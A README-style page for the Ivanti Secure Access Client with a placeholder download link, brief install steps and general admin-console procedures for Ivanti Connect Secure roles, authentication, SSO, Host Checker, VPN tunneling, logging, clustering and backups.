# Ivanti Secure Access Client

The Ivanti Secure Access Client delivers a reliable and secure remote access solution, enabling users to connect effortlessly to internal systems in compliance with enterprise policies. It ensures that individuals—regardless of their location—can securely access company applications, servers, and file storage without compromising cybersecurity.


* [Installation](#installation)
* [User Roles and Access Control](#user-roles-and-access-control)
* [Authentication and Security Policies](#authentication-and-security-policies)
* [Single Sign-On (SSO) and Adaptive Authentication](#single-sign-on-sso-and-adaptive-authentication)
* [Host Checker and Endpoint Security](#host-checker-and-endpoint-security)
* [VPN Tunneling and Secure Application Manager](#vpn-tunneling-and-secure-application-manager)

## Installation

**[Download Ivanti Secure Access Client](*)**

Once you've downloaded the Ivanti Secure Access Client, follow these instructions to install and configure it:

* Launch the installer and follow the on-screen prompts to complete the installation.
* Log in using your enterprise credentials.
* Set up VPN configurations based on your organization's security protocols.
* Establish a secure connection to safely access internal resources.

For more in-depth assistance, refer to your IT department or consult the official Ivanti documentation.

## User Roles and Access Control

### Understanding User Roles

User roles are essential for determining the permissions assigned to various user groups in ICS. Administrators can create specific roles that manage access to resources, session settings, and interface functionality.

### Role-Based Access Management

ICS features two primary role categories:

* **Administrator Roles:** Offer full administrative control within the ICS platform.
* **User Roles:** Define session parameters, access permissions, and available features for standard users.

#### Creating a New User Role

```plaintext
1. Navigate to Users > User Roles in the admin console.
2. Click "New Role" and assign a name.
3. Define session policies and access levels.
4. Save the role and link it with the appropriate authentication realms.
```

## Authentication and Security Policies

### Authentication Methods

ICS integrates with various authentication servers to validate user identity, such as:

* **Local Authentication Server**
* **Active Directory (AD)**
* **LDAP**
* **RADIUS**
* **SAML-based systems**

### Setting Up Authentication Realms

Authentication realms determine how users are authenticated and assigned to specific roles.

#### Configuration Steps

1. Navigate to **Users > Authentication > User Realms**.
2. Click **New Realm** and input a unique name.
3. Select the authentication server of choice.
4. Configure user validation and role-mapping rules.
5. Save the settings and associate the realm with a sign-in policy.

> **\[!info]**
> Enabling multi-factor authentication (MFA) is strongly recommended for enhanced security.

## Single Sign-On (SSO) and Adaptive Authentication

### Configuring SSO

Single Sign-On (SSO) allows users to log in once and seamlessly access multiple applications without re-authenticating.

ICS supports the following SSO methods:

* **SAML 2.0 for web-based SSO**
* **NTLM authentication**
* **Kerberos protocol**

#### Enabling SSO

```plaintext
1. Go to Authentication > Single Sign-On.
2. Choose your preferred protocol (SAML, NTLM, or Kerberos).
3. Enter the identity provider details.
4. Link the SSO configuration to the relevant authentication realms.
5. Save and verify the login procedure.
```

### Adaptive Authentication

Adaptive authentication analyzes various factors, such as user behavior, device attributes, and location, to determine appropriate access privileges.

#### Implementation Steps

* Create risk profiles based on device status, IP address, and behavioral patterns.
* Define rules to adjust authentication levels according to the assessed risk.

## Host Checker and Endpoint Security

**Host Checker** acts as a compliance scanner, ensuring that the device attempting to connect meets predefined security criteria before granting access.

### Configuring Host Checker Policies

1. Navigate to **Authentication > Host Checker**.
2. Develop a policy that specifies compliance requirements (e.g., antivirus status, firewall settings, OS patch level).
3. Assign the policy to relevant authentication realms.
4. Set up actions for devices that do not meet the compliance standards.

> **\[!note]**
> Regularly update Host Checker policies to address emerging threats.

## VPN Tunneling and Secure Application Manager

### VPN Tunneling

ICS utilizes **SSL-based VPN tunneling** to provide full Layer 3 network access to internal corporate systems.

#### Configuration Steps

* Navigate to **Users > User Roles** and enable **VPN Tunneling**.
* Set routing parameters and enable split tunneling if necessary.
* Apply policies for controlling session duration and bandwidth usage.

### Secure Application Manager (SAM)

SAM ensures secure access to application-level traffic used by client-server applications.

#### Enabling SAM

* Navigate to **Users > User Roles > Secure Application Manager**.
* Specify allowed services and define server destinations.
* Apply access policies based on the user role.

## Resource Policies and Access Control

Resource policies define how users access **web-based applications, shared files, and internal systems**.

### Creating Resource Policies

1. Go to **Users > Resource Policies**.
2. Choose the appropriate resource type (Web, File, Terminal Services, etc.).
3. Specify permitted or restricted resources.
4. Link the policy to relevant user roles.

> **\[!important]**
> Regularly audit resource policies to ensure alignment with security standards.

## Logging, Monitoring, and Troubleshooting

### Logging and Event Monitoring

ICS offers comprehensive tools for **logging and real-time event monitoring**.

* Enable logging through **System > Logging**.
* Use **Syslog** to forward logs to external monitoring solutions.
* Utilize **Admin Console diagnostics** to track active issues.

### Troubleshooting Common Issues

* **Login failures:** Verify authentication server configurations and network connectivity.
* **VPN connectivity issues:** Check firewall rules and VPN configuration settings.
* **Performance issues:** Monitor system load and consider implementing load balancing solutions.

## Clustering and High Availability

### Configuring Clustering

ICS supports **clustering** to enhance fault tolerance and ensure balanced traffic distribution.

#### Setup Steps

1. Navigate to **System > Clustering**.
2. Add additional nodes and configure synchronization settings.
3. Choose between **active/passive** or **active/active** clustering modes.

## System Maintenance and Configuration Backup

### Performing System Updates

Regular updates are essential for **security and system stability**.

#### Updating ICS

1. Navigate to **Maintenance > System Update**.
2. Upload the latest firmware file.
3. Reboot the system to apply the update.

#### Backup Process

* Go to **Maintenance > Configuration Backup**.
* Click **Export Configuration**.
* Store the backup in a **secure and accessible location**.
